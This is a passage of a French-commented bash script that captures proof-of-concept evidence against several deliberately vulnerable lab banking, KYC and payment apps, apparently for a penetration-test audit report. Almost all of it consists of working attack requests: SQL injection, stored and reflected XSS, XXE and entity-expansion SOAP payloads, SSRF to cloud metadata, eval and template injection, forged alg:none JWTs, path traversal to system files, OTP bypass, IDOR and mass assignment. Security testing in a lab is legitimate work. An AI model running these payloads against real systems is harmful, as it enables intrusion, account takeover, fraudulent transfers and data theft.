  cap APP-06 APP06-V001 -- -X POST "$A/graphql" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' --data "{\"query\":\"{node(id:\\\"${BID6:-QWNjb3VudDoy}\\\"){... on Account{balanceCents}}}\"}"  # BOLA via node(id)
  cap APP-06 APP06-V009 -- -X POST "$A/graphql" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' --data '{"query":"{notifications(userId:\"mobile-bruno\"){body}}"}'  # IDOR notifications
}

# ---------------- APP-09 (FastAPI / OIDC PKCE) ----------------
cap_app09(){ local A="https://app09.lab.zt3c-consulting.com" RU="https://novabourse.lab.exemple/callback"
  curl -sk -X POST "$A/admin/reset" -o /dev/null
  local V C CODE TOK
  V=$(python3 -c "import secrets;print(secrets.token_urlsafe(48))")
  C=$(python3 -c "import hashlib,base64,sys;print(base64.urlsafe_b64encode(hashlib.sha256(sys.argv[1].encode()).digest()).rstrip(b'=').decode())" "$V")
  CODE=$(curl -sk -i "$A/authorize?response_type=code&client_id=novabourse-spa&redirect_uri=$RU&code_challenge=$C&code_challenge_method=S256&state=x&login=invest-a" | grep -i '^location:' | grep -oE 'code=[^&[:space:]]+' | cut -d= -f2 | tr -d '\r')
  TOK=$(curl -sk -X POST "$A/token" --data "grant_type=authorization_code&code=$CODE&redirect_uri=$RU&client_id=novabourse-spa&code_verifier=$V" | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')
  cap APP-09 APP09-V002 -- -i "$A/authorize?response_type=code&client_id=novabourse-spa&redirect_uri=https://novabourse.lab.exemple.attaquant.lab.exemple/callback&code_challenge=x&code_challenge_method=S256&state=x&login=invest-a"   # redirect_uri partiel
  cap APP-09 APP09-V015 -- "$A/api/portfolios" -H "Origin: https://attaquant.evil" -H "Authorization: Bearer $TOK"   # CORS
  cap APP-09 APP09-V006 -- -X POST "$A/api/orders/ORD-3001/cancel" -H "Authorization: Bearer $TOK"   # annulation ordre EXECUTED
  cap APP-09 APP09-V010 -- -X POST "$A/api/orders" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' --data '{"accountId":"ACC-2001","instrument":"LABX","side":"BUY","quantity":1,"price":1}'   # pas de rate-limit (1 echantillon)
  # V003 login CSRF : /signin-oidc avec code valide + state arbitraire
  local V2 C2 CODE2; V2=$(python3 -c "import secrets;print(secrets.token_urlsafe(48))")
  C2=$(python3 -c "import hashlib,base64,sys;print(base64.urlsafe_b64encode(hashlib.sha256(sys.argv[1].encode()).digest()).rstrip(b'=').decode())" "$V2")
  CODE2=$(curl -sk -i "$A/authorize?response_type=code&client_id=novabourse-spa&redirect_uri=$RU&code_challenge=$C2&code_challenge_method=S256&state=attacker&login=invest-a" | grep -i '^location:' | grep -oE 'code=[^&[:space:]]+' | cut -d= -f2 | tr -d '\r')
  cap APP-09 APP09-V003 -- -i "$A/signin-oidc?code=$CODE2&state=ARBITRAIRE"
  # --- ajouts couverture ---
  # helper : 1er id de portefeuille (la réponse est une LISTE JSON) + instrument réel
  pfid(){ curl -sk "$A/api/portfolios" -H "Authorization: Bearer $1" | python3 -c 'import sys,json
try:
 d=json.load(sys.stdin); a=d["portfolios"] if isinstance(d,dict) else d; print(a[0]["id"])
except Exception: print("")'; }
  local PIDA; PIDA=$(pfid "$TOK")
  local INSTR="FR-NOVA"
  # accountId réel (les ordres portent accountId=ACC-xxxx, distinct du portfolioId)
  acctid(){ curl -sk "$A/api/me/orders/export.json" -H "Authorization: Bearer $1" | python3 -c 'import sys,json
try:
 d=json.load(sys.stdin); o=d.get("orders") or []; print(o[0]["accountId"] if o else "")
except Exception: print("")'; }
  local ACA; ACA=$(acctid "$TOK")
  cap APP-09 APP09-V007 -- "$A/openapi.json"                                                      # schéma OpenAPI complet
  cap APP-09 APP09-V009 -- "$A/api/instruments?q=x%27%20OR%20%271%27%3D%271" -H "Authorization: Bearer $TOK"  # SQLi recherche instrument
  cap APP-09 APP09-V011 -- "$A/api/admin/orders" -H "Authorization: Bearer $TOK"                   # BFLA back-office
  cap APP-09 APP09-V013 -- "$A/docs"                                                               # Swagger UI exposé
  cap APP-09 APP09-V014 -- "$A/"                                                                   # en-têtes absents
  cap APP-09 APP09-V016 -- "$A/"                                                                   # bannière/version
  cap APP-09 APP09-V018 -- "$A/api/accounts/directory" -H "Authorization: Bearer $TOK"             # exposition excessive (annuaire)
  cap APP-09 APP09-V019 -- "$A/api/instruments/logo?url=http://169.254.169.254/latest/meta-data/" -H "Authorization: Bearer $TOK"  # SSRF
  cap APP-09 APP09-V020 -- "$A/api/export/orders.csv"                                              # export sans auth
  cap APP-09 APP09-V021 -- "$A/api/stats/orders?window=@@" -H "Authorization: Bearer $TOK"         # trace verbeuse
  cap APP-09 APP09-V022 -- "$A/api/screener?expr=__import__('os').popen('id').read()" -H "Authorization: Bearer $TOK"  # injection eval()
  cap APP-09 APP09-V005 -- -X POST "$A/api/orders" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' --data "{\"accountId\":\"${ACA:-ACC-2001}\",\"instrument\":\"$INSTR\",\"side\":\"BUY\",\"quantity\":1,\"price\":-1}"  # mass-assign prix négatif
  cap APP-09 APP09-V012 -- -X POST "$A/api/portfolios" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' --data '{"name":"<img src=x onerror=alert(1)>"}'  # XSS stocké (React)
  # JWT alg:none (V017) et exp ignoré (V008) : /api/whoami accepte alg:none ; V008 = même forge mais exp passé
  local NJ9 EJ9
  NJ9=$(python3 -c 'import base64,json
def b(o):return base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b"=").decode()
print(b({"alg":"none","typ":"JWT"})+"."+b({"sub":"invest-a","role":"backoffice"})+".")')
  EJ9=$(python3 -c 'import base64,json,time
def b(o):return base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b"=").decode()
print(b({"alg":"none","typ":"JWT"})+"."+b({"sub":"invest-a","role":"backoffice","exp":int(time.time())-3600})+".")')
  cap APP-09 APP09-V017 -- "$A/api/whoami" -H "Authorization: Bearer $NJ9"                          # JWT alg:none
  cap APP-09 APP09-V008 -- "$A/api/whoami" -H "Authorization: Bearer $EJ9"                          # exp ignoré (token expiré accepté)
  # S3 : token invest-b + id portefeuille pour IDOR/BOLA
  local VB CB CODEB TOKB PIDB
  VB=$(python3 -c "import secrets;print(secrets.token_urlsafe(48))")
  CB=$(python3 -c "import hashlib,base64,sys;print(base64.urlsafe_b64encode(hashlib.sha256(sys.argv[1].encode()).digest()).rstrip(b'=').decode())" "$VB")
  CODEB=$(curl -sk -i "$A/authorize?response_type=code&client_id=novabourse-spa&redirect_uri=$RU&code_challenge=$CB&code_challenge_method=S256&state=x&login=invest-b" | grep -i '^location:' | grep -oE 'code=[^&[:space:]]+' | cut -d= -f2 | tr -d '\r')
  TOKB=$(curl -sk -X POST "$A/token" --data "grant_type=authorization_code&code=$CODEB&redirect_uri=$RU&client_id=novabourse-spa&code_verifier=$VB" | python3 -c 'import sys,json
try: print(json.load(sys.stdin)["access_token"])
except: print("")')
  local PIDB; PIDB=$(pfid "$TOKB")
  local ACB; ACB=$(acctid "$TOKB")
  cap APP-09 APP09-V001 -- "$A/api/portfolios/${PIDB:-PF-1001}" -H "Authorization: Bearer $TOK"     # IDOR portefeuille invest-b
  cap APP-09 APP09-V004 -- -X POST "$A/api/orders" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' --data "{\"accountId\":\"${ACB:-ACC-2002}\",\"instrument\":\"$INSTR\",\"side\":\"BUY\",\"quantity\":1,\"price\":1}"  # BOLA : ordre sur le compte d'invest-b
}

# ---------------- APP-10 (KYC / microservices) ----------------
cap_app10(){ local A="https://app10.lab.zt3c-consulting.com"
  curl -sk -X POST "$A/admin/reset" -o /dev/null
  local OBR; OBR=$(curl -sk -i -X POST "$A/login" -H 'Content-Type: application/json' --data "{\"username\":\"prospect1\",\"password\":\"$PW\",\"otp\":\"$OTP\"}" | grep -i set-cookie | grep -oE 'OBRSESSION=[^;]+')
  cap APP-10 APP10-V012 -- -H "X-Forwarded-Host: evil.attaquant.lab" "$A/api/config"   # cache poisoning (requete empoisonnante)
  append "$(B APP-10 APP10-V012)" "PREUVE : requete propre -> X-Cache: HIT + hote empoisonne" "$A/api/config"
  cap APP-10 APP10-V011 -- "$A/api/config"                                            # fuite X-Service/X-Upstream
  cap APP-10 APP10-V013 -- -X POST "$A/api/admin/onboarding/1001/decision" -H "Cookie: $OBR" -H 'Content-Type: application/json' --data '{"decision":"APPROVED"}'   # BFLA
  cap APP-10 APP10-V016 -- "$A/api/account/notifications" -H "Origin: https://attaquant.evil" -H "Cookie: $OBR"   # CORS
  printf '<html>LAB-APP10-V007</html>' > /tmp/x10.html
  cap APP-10 APP10-V007 -- -X POST "$A/api/onboarding/1001/documents" -H "Cookie: $OBR" -F 'file=@/tmp/x10.html;type=text/html'   # upload non restreint
  cap APP-10 APP10-V004 -- -X POST "$A/api/documents/fetch" -H "Cookie: $OBR" -H 'Content-Type: application/json' --data '{"url":"http://kyc-internal:8080/"}'   # SSRF inter-service
  cap APP-10 APP10-V015 -- "$A/static../50x.html"                                     # traversee alias nginx
  # --- ajouts couverture ---
  cap APP-10 APP10-V001 -- "$A/internal/kyc" -H "X-Internal-Auth: 1"                              # contournement proxy (en-tête de confiance forgé)
  cap APP-10 APP10-V002 -- "$A/api/onboarding" -H "Cookie: $OBR" -H "X-Forwarded-Host: attaquant.evil" -H "X-Forwarded-For: 10.0.0.1"  # confiance X-Forwarded-*
  cap APP-10 APP10-V003 -- --path-as-is "$A/api/..%2fadmin"                                        # contournement par normalisation
  cap APP-10 APP10-V010 -- -i "$A/api/redirect?target=foo%0d%0aSet-Cookie:x=1"                     # injection d'en-tête CRLF
  cap APP-10 APP10-V014 -- "$A/"                                                                   # HSTS / en-têtes absents
  cap APP-10 APP10-V018 -- "$A/api/support/search?q=%3Cscript%3Ealert('v018')%3C/script%3E"        # XSS réfléchi
  cap APP-10 APP10-V019 -- -i "$A/api/journey/continue?next=https://attaquant.evil"                # open redirect
  local DOC10; DOC10=$(curl -sk "$A/api/onboarding/1001/documents" -H "Cookie: $OBR" | python3 -c 'import sys,json
try:
 d=json.load(sys.stdin); a=d["documents"] if isinstance(d,dict) and "documents" in d else d
 print((a[0].get("id") or a[0].get("docId")) if isinstance(a,list) and a else "")
except Exception: print("")')
  cap APP-10 APP10-V021 -- "$A/api/documents/${DOC10:-1}/details" -H "Cookie: $OBR"                 # exposition excessive (détail pièce)
  cap APP-10 APP10-V008 -- -X PUT "$A/api/onboarding/1001" -H "Cookie: $OBR" -H 'Content-Type: application/json' --data '{"status":"APPROVED"}'  # mass-assign statut KYC
  cap APP-10 APP10-V009 -- -X POST "$A/api/onboarding/1001/verify" -H "Cookie: $OBR" -H 'Content-Type: application/json' --data '{"otp":"anything","verified":true}'  # OTP contournable (côté client)
  cap APP-10 APP10-V017 -- -X POST "$A/api/account/recover" -H 'Content-Type: application/json' --data '{"username":"prospect1"}'  # énumération (existant)
  append "$(B APP-10 APP10-V017)" "PREUVE : username INEXISTANT -> réponse distincte" -X POST "$A/api/account/recover" -H 'Content-Type: application/json' --data '{"username":"nobody-zzz"}'
  # V020 : assertion JWT inter-service alg=none
  local SJ10; SJ10=$(python3 -c 'import base64,json
def b(o):return base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b"=").decode()
print(b({"alg":"none","typ":"JWT"})+"."+b({"svc":"kyc-internal","role":"service"})+".")')
  cap APP-10 APP10-V020 -- -X POST "$A/api/documents/import" -H "Cookie: $OBR" -H "X-Service-Token: $SJ10" -H 'Content-Type: application/json' --data '{"ref":"LAB"}'  # JWT inter-service alg=none
  # V006 IDOR : dossier KYC de prospect2
  local OBR2 OID2
  OBR2=$(curl -sk -i -X POST "$A/login" -H 'Content-Type: application/json' --data "{\"username\":\"prospect2\",\"password\":\"$PW\",\"otp\":\"$OTP\"}" | grep -i set-cookie | grep -oE 'OBRSESSION=[^;]+')
  OID2=$(curl -sk "$A/api/onboarding" -H "Cookie: $OBR2" | grep -oE '[0-9]{4,}' | head -1)
  cap APP-10 APP10-V006 -- "$A/api/onboarding/${OID2:-1002}" -H "Cookie: $OBR"                      # IDOR dossier KYC prospect2
}

# ---------------- APP-07 (WCF SOAP 1.1 / IIS) ----------------
cap_app07(){ local A="https://app07.lab.zt3c-consulting.com" SVC="https://app07.lab.zt3c-consulting.com/PaymentService.svc"
  local WSSE='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd'
  local PAY='https://paygate.lab.exemple/payment' CT='Content-Type: text/xml; charset=utf-8' OP='operateur-ent'
  curl -sk -X POST "$A/admin/reset" -H 'Content-Length: 0' -o /dev/null   # IIS exige Content-Length
  env_auth(){ printf '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:pay="%s"><soap:Header><wsse:Security xmlns:wsse="%s"><wsse:UsernameToken><wsse:Username>%s</wsse:Username><wsse:Password>%s</wsse:Password></wsse:UsernameToken></wsse:Security></soap:Header><soap:Body>%s</soap:Body></soap:Envelope>' "$PAY" "$WSSE" "$2" "$3" "$1"; }
  env_noauth(){ printf '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:pay="%s"><soap:Body>%s</soap:Body></soap:Envelope>' "$PAY" "$1"; }
  sc(){ cap APP-07 "$1" -- -X POST "$SVC" -H "$CT" -H "SOAPAction: \"$2\"" --data "$3"; }
  sc APP07-V003 GetOrder "$(env_auth '<pay:GetOrder><pay:ref>ORD-LAB-100</pay:ref></pay:GetOrder>' service-interne n-importe-quoi)"
  sc APP07-V005 CancelAllBatches "$(env_auth '<pay:CancelAllBatches><pay:scope>ALL</pay:scope></pay:CancelAllBatches>' "$OP" "$PW")"
  sc APP07-V011 GetOrder "$(env_auth "<pay:GetOrder><pay:ref>ZZZ-NOPE' OR '1'='1</pay:ref></pay:GetOrder>" "$OP" "$PW")"
  sc APP07-V017 FindBeneficiary "$(env_auth "<pay:FindBeneficiary><pay:name>' or '1'='1</pay:name></pay:FindBeneficiary>" "$OP" "$PW")"
  sc APP07-V016 ImportOrderFromUrl "$(env_auth '<pay:ImportOrderFromUrl><pay:sourceUrl>file:///C:/lab/fixtures/ssrf-canary.txt</pay:sourceUrl></pay:ImportOrderFromUrl>' "$OP" "$PW")"
  sc APP07-V018 ExportBatchJournal "$(env_noauth '<pay:ExportBatchJournal/>')"
  sc APP07-V020 GetOrderDiag "$(env_auth '<pay:GetOrderDiag><pay:ref>ORD-LAB-DOES-NOT-EXIST</pay:ref></pay:GetOrderDiag>' "$OP" "$PW")"
  sc APP07-V021 UpdateOrder "$(env_auth '<pay:UpdateOrder><pay:reference>ORD-LAB-100</pay:reference><pay:owner>service-interne</pay:owner><pay:status>SETTLED</pay:status></pay:UpdateOrder>' "$OP" "$PW")"
  sc APP07-V002 SubmitOrder "$(env_auth '<pay:SubmitOrder><pay:reference>ORD-LAB-002</pay:reference><pay:amount>1.00<!--</pay:amount><pay:amount>-->999999.00</pay:amount><pay:currency>EUR</pay:currency><pay:creditorIban>FR7630001007941234567890185</pay:creditorIban></pay:SubmitOrder>' "$OP" "$PW")"
  append "$(B APP-07 APP07-V002)" "PREUVE : relecture GetOrder ORD-LAB-002 (amount retenu)" -X POST "$SVC" -H "$CT" -H 'SOAPAction: "GetOrder"' --data "$(env_auth '<pay:GetOrder><pay:ref>ORD-LAB-002</pay:ref></pay:GetOrder>' "$OP" "$PW")"
  local E7; E7="$(env_auth '<pay:SubmitOrder><pay:reference>ORD-REPLAY-7</pay:reference><pay:amount>500.00</pay:amount><pay:currency>EUR</pay:currency><pay:creditorIban>FR7630001007941234567890185</pay:creditorIban></pay:SubmitOrder>' "$OP" "$PW")"
  curl -sk -o /dev/null -X POST "$SVC" -H "$CT" -H 'SOAPAction: "SubmitOrder"' --data "$E7"
  sc APP07-V007 SubmitOrder "$E7"
  cap APP-07 APP07-V009 -- "$SVC/err"
  local BL='<?xml version="1.0"?><!DOCTYPE soap:Envelope [<!ENTITY a "LAB-LAB-LAB-LAB-LAB"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"><!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;"><!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:pay="'"$PAY"'"><soap:Header><wsse:Security xmlns:wsse="'"$WSSE"'"><wsse:UsernameToken><wsse:Username>'"$OP"'</wsse:Username><wsse:Password>'"$PW"'</wsse:Password></wsse:UsernameToken></wsse:Security></soap:Header><soap:Body><pay:GetOrder><pay:ref>&e;</pay:ref></pay:GetOrder></soap:Body></soap:Envelope>'
  sc APP07-V006 SubmitOrder "$BL"
  local XXE='<?xml version="1.0" encoding="utf-8"?><!DOCTYPE soap:Envelope [ <!ENTITY xxe SYSTEM "file:///C:/lab/fixtures/xxe-canary.txt"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:pay="'"$PAY"'"><soap:Header><wsse:Security xmlns:wsse="'"$WSSE"'"><wsse:UsernameToken><wsse:Username>'"$OP"'</wsse:Username><wsse:Password>'"$PW"'</wsse:Password></wsse:UsernameToken></wsse:Security></soap:Header><soap:Body><pay:SubmitOrder><pay:reference>&xxe;</pay:reference><pay:amount>100.00</pay:amount><pay:currency>EUR</pay:currency><pay:creditorIban>FR7630001007941234567890185</pay:creditorIban></pay:SubmitOrder></soap:Body></soap:Envelope>'
  sc APP07-V001 SubmitOrder "$XXE"
  # --- ajouts couverture ---
  cap APP-07 APP07-V004 -- "$SVC?wsdl"                                              # WSDL : opérations internes listées
  cap APP-07 APP07-V010 -- "$A/batches/"                                            # directory listing
  cap APP-07 APP07-V012 -- -X OPTIONS "$A/"                                         # méthodes WebDAV (en-tête Allow)
  cap APP-07 APP07-V013 -- "$A/"                                                    # HSTS / en-têtes de sécurité absents
  cap APP-07 APP07-V014 -- "$A/receipts/download?name=..%5c..%5cwindows%5cwin.ini"  # traversée de chemin (accusé)
  cap APP-07 APP07-V019 -- "$A/legacy/Report.aspx"                                  # clickjacking (Report.aspx)
}

# ---------------- APP-01 (Java / Spring Boot) ----------------
cap_app01(){ local A="https://app01.lab.zt3c-consulting.com" J=/tmp/j1.txt tok
  curl -sk -X POST "$A/admin/reset" -o /dev/null; rm -f $J
  tok=$(curl -sk -c $J "$A/login" | grep -oE 'name="_csrf"[^>]*value="[^"]+"' | head -1 | sed -E 's/.*value="([^"]+)".*/\1/')
  curl -sk -c $J -b $J -X POST "$A/login" --data-urlencode "username=alice" --data-urlencode "password=$PW" --data-urlencode "_csrf=$tok" -o /dev/null
  csrf1(){ curl -sk -b $J "$A$1" | grep -oE 'name="_csrf"[^>]*value="[^"]+"' | head -1 | sed -E 's/.*value="([^"]+)".*/\1/'; }
  cap APP-01 APP01-V001 -- -b $J "$A/accounts/ACC-1001/transactions?label=x%27%20OR%20%271%27%3D%271"   # SQLi label
  cap APP-01 APP01-V003 -- -b $J "$A/search?q=%3Csvg%2Fonload%3Dalert(1)%3E"                            # XSS réfléchi
  cap APP-01 APP01-V004 -- -b $J "$A/statements/download?file=..%2f..%2f..%2f..%2fetc%2fpasswd"         # path traversal
  cap APP-01 APP01-V005 -- -b $J "$A/accounts/ACC-2001"                                                 # IDOR
  cap APP-01 APP01-V006 -- -b $J "$A/api/accounts/ACC-2001/balance"                                     # IDOR API
  cap APP-01 APP01-V009 -- -i -c /tmp/j1b.txt -X POST "$A/login" --data-urlencode "username=alice" --data-urlencode "password=$PW" --data-urlencode "_csrf=$tok"  # cookie flags
  # V010 open redirect : la 30x survient à la connexion réussie avec returnUrl
  local jr1=/tmp/j1or.txt rt1; rt1=$(curl -sk -c $jr1 "$A/login" | grep -oE 'name="_csrf"[^>]*value="[^"]+"' | head -1 | sed -E 's/.*value="([^"]+)".*/\1/')
  cap APP-01 APP01-V010 -- -i -c $jr1 -b $jr1 -X POST "$A/login?returnUrl=https://evil.exemple/phish" --data-urlencode "username=alice" --data-urlencode "password=$PW" --data-urlencode "_csrf=$rt1"
  cap APP-01 APP01-V011 -- "$A/"                                                                        # HSTS absent
  cap APP-01 APP01-V016 -- "$A/"                                                                        # version headers
  cap APP-01 APP01-V018 -- -b $J -H "Origin: https://attaquant.evil" "$A/api/profile"                   # CORS
  cap APP-01 APP01-V019 -- -b $J "$A/accounts/ACC-1001"                                                 # clickjacking (page 200)
  cap APP-01 APP01-V020 -- -X POST "$A/password/account-check" -H 'Content-Type: application/x-www-form-urlencoded' --data 'email=alice@lab.exemple'  # account enum
  cap APP-01 APP01-V021 -- -b $J "$A/tools/evaluate?expr=31337-7"                                       # SpEL (31330 attendu)
  cap APP-01 APP01-V022 -- -b $J "$A/api/users/alice"                                                   # excessive data
  cap APP-01 APP01-V012 -- -X POST "$A/password/reset" -H "Host: evil.attaquant.lab" -H 'Content-Type: application/x-www-form-urlencoded' --data 'email=alice@lab.exemple'  # host header injection
  cap APP-01 APP01-V002 -- -b $J -X POST "$A/beneficiaries" --data-urlencode "_csrf=$(csrf1 /beneficiaries)" --data-urlencode "name=<script>alert('v002')</script>" --data-urlencode "iban=FR7630001007941234567890185"  # XSS stocké
  cap APP-01 APP01-V017 -- -b $J -X POST "$A/profile/update" --data-urlencode "_csrf=$(csrf1 /profile)" --data-urlencode "role=ADMIN" --data-urlencode "email=alice@lab.exemple"  # mass-assign
  # V008 : over-post activatedAt sur l'édition d'un bénéficiaire existant (BEN-01)
  cap APP-01 APP01-V008 -- -b $J -X POST "$A/beneficiaries/BEN-01/edit" --data-urlencode "_csrf=$(csrf1 /beneficiaries/BEN-01/edit)" --data-urlencode "name=Bob" --data-urlencode "iban=FR7630001007941234567890185" --data-urlencode "note=x" --data-urlencode "activatedAt=2000-01-01T00:00:00"
  # V007 : créer un virement (étape normale) puis confirmer SANS OTP (bypass de validation)
  # créer un virement (-> PENDING_OTP) ; la création redirige vers la liste, on y relit l'id TRF le plus récent
  curl -sk -b $J -o /dev/null -X POST "$A/transfers" --data-urlencode "_csrf=$(csrf1 /transfers)" --data-urlencode "sourceAccount=ACC-1001" --data-urlencode "beneficiaryId=BEN-01" --data-urlencode "amount=1000"
  local TID; TID=$(curl -sk -b $J "$A/transfers" | grep -oE 'transfers/TRF-[0-9]+/confirm' | grep -oE 'TRF-[0-9]+' | sort -t- -k2 -n | tail -1)
  # confirmer SANS OTP (corps = _csrf seul) -> doit passer EXECUTED (contournement 2FA)
  cap APP-01 APP01-V007 -- -b $J -X POST "$A/transfers/${TID:-TRF-08}/confirm" --data-urlencode "_csrf=$(csrf1 /transfers)"
  # preuve : la liste /transfers montre le virement ${TID} avec le badge "Exécuté" et la colonne OTP vide ("—")
  append "$(B APP-01 APP01-V007)" "PREUVE : GET /transfers — ligne ${TID:-TRF-08} au statut Exécuté SANS OTP validé" -b $J "$A/transfers"
}

# ---------------- APP-08 (Ruby / Rails) ----------------
cap_app08(){ local A="https://app08.lab.zt3c-consulting.com" J=/tmp/j8.txt K="X-API-Key: key-client-a-7f3a" at
  curl -sk -X POST "$A/admin/reset" -o /dev/null; rm -f $J
  at=$(curl -sk -c $J "$A/login" | grep -oE 'name="authenticity_token"[^>]*value="[^"]+"' | head -1 | sed -E 's/.*value="([^"]+)".*/\1/')
  curl -sk -c $J -b $J -X POST "$A/login" --data-urlencode "authenticity_token=$at" --data-urlencode "username=client-a" --data-urlencode "password=$PW" --data-urlencode "otp=$OTP" -o /dev/null
  meta8(){ curl -sk -b $J "$A$1" | grep -oE 'name="csrf-token" content="[^"]+"' | head -1 | sed -E 's/.*content="([^"]+)".*/\1/'; }
  # --- API (clé statique) ---
  cap APP-08 APP08-V003 -- "$A/api/cards" -H "$K"                                      # clé statique
  cap APP-08 APP08-V002 -- "$A/api/cards/1002" -H "$K"                                 # BOLA
  cap APP-08 APP08-V009 -- "$A/api/cards/1001" -H "$K"                                 # PAN complet
  cap APP-08 APP08-V001 -- -X PUT "$A/api/cards/1001" -H "$K" -H 'Content-Type: application/json' --data '{"limit":999999}'  # mass-assign limit
  cap APP-08 APP08-V004 -- -X POST "$A/api/cards/1002/block" -H "$K"                   # BFLA opposition
  cap APP-08 APP08-V018 -- "$A/api/profile" -H "$K" -H "Origin: https://attaquant.evil"  # CORS
  # --- Web (session) ---
  cap APP-08 APP08-V006 -- -b $J "$A/cards?order=label%20ASC;SELECT%20pg_sleep(5)--"   # SQLi order
  cap APP-08 APP08-V012 -- "$A/cards/err"                                             # erreur verbeuse
  # V013 open redirect : connexion avec redirect -> 302 vers le domaine externe
  local jr8=/tmp/j8or.txt at8; at8=$(curl -sk -c $jr8 "$A/login?redirect=https://evil.exemple/phish" | grep -oE 'name="authenticity_token"[^>]*value="[^"]+"' | head -1 | sed -E 's/.*value="([^"]+)".*/\1/')
  cap APP-08 APP08-V013 -- -i -c $jr8 -b $jr8 -X POST "$A/login" --data-urlencode "authenticity_token=$at8" --data-urlencode "username=client-a" --data-urlencode "password=$PW" --data-urlencode "otp=$OTP" --data-urlencode "redirect=https://evil.exemple/phish"
  cap APP-08 APP08-V014 -- "$A/"                                                      # headers manquants
  cap APP-08 APP08-V016 -- "$A/"                                                      # bannière/version
  cap APP-08 APP08-V015 -- --path-as-is "$A//rails/info/properties"                   # normalisation chemin (double slash)
  cap APP-08 APP08-V017 -- -b $J "$A/cards/lookup?q=%3Cscript%3Ealert('v017')%3C/script%3E"  # XSS réfléchi
  cap APP-08 APP08-V019 -- -b $J "$A/cards/1001/embed"                               # clickjacking
  cap APP-08 APP08-V011 -- -i -c /tmp/j8b.txt -X POST "$A/login" --data-urlencode "authenticity_token=$at" --data-urlencode "username=client-a" --data-urlencode "password=$PW" --data-urlencode "otp=$OTP"  # cookie session
  # V020 énumération : POST /password/reset, param username ; compte existant -> 200, inexistant -> 404 (réponses distinctes)
  cap APP-08 APP08-V020 -- -X POST "$A/password/reset" --data-urlencode "username=client-a"  # account enum (existant -> 200)
  append "$(B APP-08 APP08-V020)" "PREUVE : username INEXISTANT -> réponse distincte (404 'Aucun compte ne correspond')" -X POST "$A/password/reset" --data-urlencode "username=nobody-zzz"
  # re-login frais dans $J : une capture précédente (V011) a pu invalider la session côté serveur
  at=$(curl -sk -c $J "$A/login" | grep -oE 'name="authenticity_token"[^>]*value="[^"]+"' | head -1 | sed -E 's/.*value="([^"]+)".*/\1/')
  curl -sk -c $J -b $J -X POST "$A/login" --data-urlencode "authenticity_token=$at" --data-urlencode "username=client-a" --data-urlencode "password=$PW" --data-urlencode "otp=$OTP" -o /dev/null
  # --- POST web avec CSRF Rails (cookie de session rotatif -> GET-form ET POST en -c -b) ---
  # jeton per-form d'une action, en synchronisant le jar (-c -b)
  ftok(){ curl -sk -c $J -b $J "$A/cards/1001" | tr '<' '\n<' | grep -A6 "form action=\"$1\"" | grep -oE 'value="[^"]+"' | head -1 | sed -E 's/value="([^"]+)"/\1/'; }
  mtok(){ curl -sk -c $J -b $J "$A/cards/1001" | grep -oE 'name="csrf-token" content="[^"]+"' | head -1 | sed -E 's/.*content="([^"]+)".*/\1/'; }
  cap APP-08 APP08-V007 -- -c $J -b $J -X POST "$A/cards/1001/rename" --data-urlencode "authenticity_token=$(ftok /cards/1001/rename)" --data-urlencode "card[label]=<img src=x onerror=alert('v007')>"  # XSS stocké (libellé)
  cap APP-08 APP08-V010 -- -c $J -b $J -X POST "$A/cards/1001/toggle" --data-urlencode "authenticity_token=$(ftok /cards/1001/toggle)"   # CSRF-exempt
  cap APP-08 APP08-V008 -- -c $J -b $J -X POST "$A/cards/1001/dispute" --data-urlencode "authenticity_token=$(ftok /cards/1001/dispute)" --data-urlencode "amount=200"   # cumul recrédits
  cap APP-08 APP08-V005 -- -c $J -b $J -X POST "$A/cards/1001" --data-urlencode "_method=patch" --data-urlencode "authenticity_token=$(curl -sk -c $J -b $J "$A/cards/1001/edit" | tr '<' '\n<' | grep -A8 'form action="/cards/1001"' | grep 'name="authenticity_token"' | grep -oE 'value="[^"]+"' | head -1 | sed -E 's/value="([^"]+)"/\1/')" --data-urlencode "card[label]=x" --data-urlencode "card[status]=BLOCKED"  # mass-assign status
  cap APP-08 APP08-V021 -- -c $J -b $J -H "X-CSRF-Token: $(mtok)" -X POST "$A/cards/preview" --data-urlencode "content=<%= 7*191 %>"   # ERB SSTI (jeton meta global)
  # V022 (SSRF logo) : la route /cards/{id}/logo N'EST PAS déployée dans cette instance (Rails renvoie RoutingError sur GET et POST).
  # On capture la vraie réponse comme PREUVE DE L'ÉCART DE FIDÉLITÉ (endpoint absent) — jamais de preuve fabriquée. À ne PAS compter comme vuln confirmée.
  cap APP-08 APP08-V022 -- "$A/cards/1001/logo?url=http://169.254.169.254/latest/meta-data/"   # ECART: endpoint non deploye (RoutingError attendu)
}

run(){ case "$1" in
  APP-01) cap_app01;; APP-02) cap_app02;; APP-03) cap_app03;; APP-04) cap_app04;; APP-05) cap_app05;;
  APP-06) cap_app06;; APP-07) cap_app07;; APP-08) cap_app08;; APP-09) cap_app09;; APP-10) cap_app10;;
  *) echo "app inconnue: $1";; esac; }

if [ "${1:-}" = "--all" ]; then
  for a in APP-01 APP-02 APP-03 APP-04 APP-05 APP-06 APP-07 APP-08 APP-09 APP-10; do echo "### $a ###"; run "$a" || echo "!! $a interrompue (voir au-dessus)"; done
else
  for a in "$@"; do echo "### $a ###"; run "$a" || echo "!! $a interrompue (voir au-dessus)"; done
fi
echo; echo "=> régénérez les rapports : python3 audit-report.py"
